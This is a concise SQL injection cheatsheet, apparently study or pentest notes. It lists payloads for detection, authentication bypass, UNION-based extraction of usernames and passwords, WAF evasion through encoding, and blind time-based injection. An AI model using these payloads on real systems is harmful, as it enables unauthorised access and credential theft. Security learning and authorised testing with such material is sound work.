# SQL Injection Cheatsheet

## Detecting
- `'` — single quote, look for SQL error in response
- `' OR '1'='1` — classic auth/filter bypass
- `' OR 1=1--` — comment out rest of query

## Finding column count (UNION attacks)
- `' ORDER BY 1--`, `' ORDER BY 2--`, increment until error
- or `' UNION SELECT NULL--`, add more NULLs until no error

## Determining string-compatible columns
- `' UNION SELECT 'a', NULL--` — swap position of 'a' until no error

## Extracting data
- `' UNION SELECT username, password FROM users--`
- Concat into one column: `' UNION SELECT username || ':' || password FROM users--`

## Database-specific notes
- **Oracle:** needs `FROM dual` on SELECTs with no real table. Version info in `v$version`, `banner` column.
- **MySQL:** `--` needs a trailing space, or use `#`.
- **PostgreSQL/MSSQL:** `--` works without trailing space.

## WAF bypass
- Blocked but no SQL error → WAF is filtering, not the DB.
- Try encoding the payload so the WAF misses it but the backend still decodes it.
  - Burp: install **Hackvertor** (BApp Store) → highlight payload → right-click → Extensions → Hackvertor → Encode → `dec_entities` / `hex_entities`.

## Blind SQLi
- Boolean-based: `' AND 1=1--` vs `' AND 1=2--`, compare responses
- Time-based: `'; IF (1=1) WAITFOR DELAY '0:0:5'--` (MSSQL)
